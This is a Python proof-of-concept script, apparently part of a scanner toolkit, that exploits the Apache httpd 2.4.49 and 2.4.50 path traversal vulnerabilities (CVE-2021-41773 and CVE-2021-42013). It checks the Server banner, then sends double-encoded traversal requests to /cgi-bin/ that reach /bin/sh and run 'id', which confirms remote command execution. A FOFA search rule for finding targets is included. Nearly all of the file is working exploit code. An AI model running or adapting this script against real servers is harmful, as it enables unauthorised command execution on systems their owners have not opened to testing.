#!/usr/bin/env python3
# _*_ coding:utf-8 _*_

import requests
from Config.config_proxies import proxies
from Config.config_requests import headers

requests.packages.urllib3.disable_warnings()


# 脚本信息
######################################################
NAME1='CVE-2021-41773'
NAME2='CVE-2021-42013'
AUTHOR="境心"
REMARK='Apache httpd 目录穿越漏洞'
FOFA_RULE='body="it works"'
######################################################

def poc(target):
    result = {}
    url = target+"/cgi-bin/"
    res = requests.get(url, headers=headers, verify=False, timeout=5,proxies=proxies)
    try:
        banner = res.headers['server']
    except:
        banner = ""

    data = "echo; id"

    if banner != "" and "Apache/2.4.49" in banner:
        # target_url = url + ".%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh"
        # 坑点在这
        target_url = url + ".%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh"
        target_res = requests.post(target_url, headers=headers, data=data, verify=False, timeout=5,proxies=proxies)
        if "uid" in target_res.text and "gid" in target_res.text and "groups" in target_res.text:
            result['CVE'] = NAME1
            result['target_url'] = url
            return result
    if banner != "" and "Apache/2.4.50" in banner:
        target_url = target + "/cgi-bin/.%%%33%32%%36%35/.%%%33%32%%36%35/.%%%33%32%%36%35/.%%%33%32%%36%35/.%%%33%32%%36%35/.%%%33%32%%36%35/.%%%33%32%%36%35/.%%%33%32%%36%35/.%%%33%32%%36%35/bin/sh"
        target_res = requests.post(target_url, headers=headers, data=data, verify=False, timeout=5,proxies=proxies)
        if "uid" in target_res.text and "gid" in target_res.text and "groups" in target_res.text:
            result['CVE'] = NAME2
            result['target_url'] = url
            return result


if __name__ == '__main__':
    # poc调用
    poc("http://127.0.0.1:8080")